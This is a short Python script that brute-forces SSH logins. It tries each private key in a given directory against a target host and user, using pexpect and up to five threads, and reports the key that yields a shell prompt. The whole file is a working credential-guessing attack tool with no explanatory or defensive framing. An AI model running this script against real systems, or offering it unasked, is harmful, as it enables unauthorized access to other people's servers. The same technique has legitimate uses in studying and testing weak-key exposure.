import threading
import pexpect
import argparse
import os

Stop = False
Fails = 0
max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)

def connect(host, user, key_file, release):
    global Stop
    global Fails

    try:
        perm_denied = "Permission denied"
        ssh_newkey = "Are you sure you want to continue"
        conn_close = "Connection closed by remote host"
        opts = " -o PasswordAuthentication=no"
        conn_str = "ssh " + user + "@" + host + " -i " + key_file + opts
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_close, "$", "#", ])
        if ret == 2:
            print("[+] Adding host to ~/.ssh/known_hosts")
            child.sendline("yes")
            connect(host, user, key_file, False)
        elif ret == 3:
            Fails += 1
            print("[-] Connection Closed by remote host")
        elif ret > 3:
            print("[*] Suceess " + str(key_file))
            Stop = True
    finally:
        if release: connection_lock.release()

def main():
    global Stop
    global Fails

    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", dest="host", help="Specify host name")
    parser.add_argument("-u", "--user", dest="user", help="Specify user name")
    parser.add_argument("-d", "--key_dir", dest="key_dir", help="Specify dir path of SSH keys")
    args = parser.parse_args()
    if not args.host or not args.user or not args.key_dir:
        parser.print_help()
        exit(0)
    host = args.host
    user = args.user
    key_dir = args.key_dir

    for filename in os.listdir(key_dir):
        if Stop:
            print("[*] Exiting, Key Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting, Too many connections")
            exit(0)
        connection_lock.acquire()
        full_path = os.path.join(key_dir, filename)
        print(f"[+] Testing key file : {filename}")
        t = threading.Thread(target=connect, args=(host,user, full_path, True))
        child = t.start()

if __name__ == "__main__":
    main()